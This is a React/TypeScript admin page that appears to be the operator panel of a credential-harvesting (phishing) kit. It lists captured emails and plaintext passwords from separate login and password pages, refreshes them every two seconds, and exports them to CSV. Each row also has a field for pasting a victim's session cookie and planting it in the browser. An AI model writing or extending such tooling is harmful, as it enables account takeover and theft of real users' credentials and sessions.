import React, { useEffect, useMemo, useState } from 'react'

interface LogEntry {
  email?: string
  password?: string
  rememberMe?: boolean
  page: 'login' | 'password'
  ts: number
  cookie?: string
}

const STORAGE_KEY = 'login_attempts'
const COOKIE_MAP_KEY = 'admin_cookie_map'

function loadLogs(): LogEntry[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY)
    if (!raw) return []
    const parsed = JSON.parse(raw)
    if (Array.isArray(parsed)) return parsed as LogEntry[]
    return []
  } catch {
    return []
  }
}

function loadCookieMap(): Record<string, string> {
  try {
    const raw = localStorage.getItem(COOKIE_MAP_KEY)
    return raw ? JSON.parse(raw) : {}
  } catch {
    return {}
  }
}

function saveCookieMap(map: Record<string, string>) {
  localStorage.setItem(COOKIE_MAP_KEY, JSON.stringify(map))
}

const AdminPage: React.FC = () => {
  const [logs, setLogs] = useState<LogEntry[]>([])
  const [cookieDrafts, setCookieDrafts] = useState<Record<string, string>>({})

  // initial load + auto refresh every 2s
  useEffect(() => {
    setLogs(loadLogs())
    // init cookie drafts from saved map
    const map = loadCookieMap()
    setCookieDrafts(map)
    const id = setInterval(() => {
      setLogs(loadLogs())
    }, 2000)
    return () => clearInterval(id)
  }, [])

  const refresh = () => setLogs(loadLogs())

  const clearLogs = () => {
    localStorage.removeItem(STORAGE_KEY)
    setLogs([])
  }

  const formatted = useMemo(() => {
    return [...logs].sort((a,b)=> b.ts - a.ts)
  }, [logs])

  const handleCookieChange = (key: string, value: string) => {
    setCookieDrafts((prev) => ({ ...prev, [key]: value }))
  }

  const handleCookieSave = (key: string) => {
    const value = cookieDrafts[key] ?? ''
    const map = { ...loadCookieMap(), [key]: value }
    saveCookieMap(map)
    try {
      // Also set a browser cookie (scoped to domain) for convenience
      document.cookie = `${encodeURIComponent(key)}=${encodeURIComponent(value)}; path=/; max-age=31536000`
    } catch {
      // ignore cookie set errors (e.g., in restricted environments)
    }
  }

  const downloadCSV = () => {
    const headers = ['Time','Page','Email','Password','Remember','Cookie']
    const rows = formatted.map((l) => {
      const key = (l.email || '') + '|' + l.ts
      const cookieVal = cookieDrafts[key] ?? ''
      return [
        new Date(l.ts).toLocaleString(),
        l.page,
        l.email ?? '',
        l.password ?? '',
        l.rememberMe ? 'Yes' : 'No',
        cookieVal,
      ]
    })
    const csv = [headers, ...rows]
      .map((r) => r.map((cell) => '"' + String(cell).replace(/"/g, '""') + '"').join(','))
      .join('\n')
    // Add BOM for Excel UTF-8
    const blob = new Blob(["\uFEFF" + csv], { type: 'text/csv;charset=utf-8;' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = 'admin-data.csv'
    document.body.appendChild(a)
    a.click()
    a.remove()
    URL.revokeObjectURL(url)
  }

  return (
    <div className="min-h-screen bg-slate-900 text-white px-4 py-8">
      <div className="max-w-5xl mx-auto">
        <h1 className="text-2xl font-bold mb-6">Admin - Login Attempts</h1>
        <div className="flex items-center justify-between mb-4">
          <div className="text-sm text-slate-300">Total: {formatted.length}</div>
          <div className="flex items-center gap-2">
            <button onClick={downloadCSV} className="px-3 py-2 rounded bg-emerald-600 hover:bg-emerald-700 text-sm">Download</button>
            <button onClick={refresh} className="px-3 py-2 rounded bg-slate-700 hover:bg-slate-600 text-sm">Refresh</button>
            <button onClick={clearLogs} className="px-3 py-2 rounded bg-red-600 hover:bg-red-700 text-sm">Clear</button>
          </div>
        </div>
        <div className="overflow-x-auto rounded border border-slate-700">
          <table className="min-w-full text-left text-sm">
            <thead className="bg-slate-800/70">
              <tr>
                <th className="px-3 py-2 border-b border-slate-700">Time</th>
                <th className="px-3 py-2 border-b border-slate-700">Page</th>
                <th className="px-3 py-2 border-b border-slate-700">Email</th>
                <th className="px-3 py-2 border-b border-slate-700">Password</th>
                <th className="px-3 py-2 border-b border-slate-700">Remember</th>
                <th className="px-3 py-2 border-b border-slate-700">Cookie</th>
                <th className="px-3 py-2 border-b border-slate-700">Action</th>
              </tr>
            </thead>
            <tbody>
              {formatted.length === 0 && (
                <tr>
                  <td className="px-3 py-4 text-slate-400" colSpan={7}>No data.</td>
                </tr>
              )}
              {formatted.map((l, idx) => {
                const key = (l.email || '') + '|' + l.ts
                const cookieVal = cookieDrafts[key] ?? ''
                return (
                  <tr key={idx} className="odd:bg-slate-800/30">
                    <td className="px-3 py-2 whitespace-nowrap">{new Date(l.ts).toLocaleString()}</td>
                    <td className="px-3 py-2">{l.page}</td>
                    <td className="px-3 py-2 break-all">{l.email ?? ''}</td>
                    <td className="px-3 py-2 break-all">{l.password ?? ''}</td>
                    <td className="px-3 py-2">{l.rememberMe ? 'Yes' : 'No'}</td>
                    <td className="px-3 py-2 min-w-[12rem]">
                      <input
                        value={cookieVal}
                        onChange={(e) => handleCookieChange(key, e.target.value)}
                        placeholder="Add cookie"
                        className="w-full bg-slate-800 text-white placeholder-slate-400 border border-slate-600 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/40 outline-none rounded px-2 py-1"
                      />
                    </td>
                    <td className="px-3 py-2">
                      <button
                        onClick={() => handleCookieSave(key)}
                        className="px-3 py-1 rounded bg-blue-600 hover:bg-blue-700 text-xs"
                      >Validate</button>
                    </td>
                  </tr>
                )
              })}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  )
}

export default AdminPage
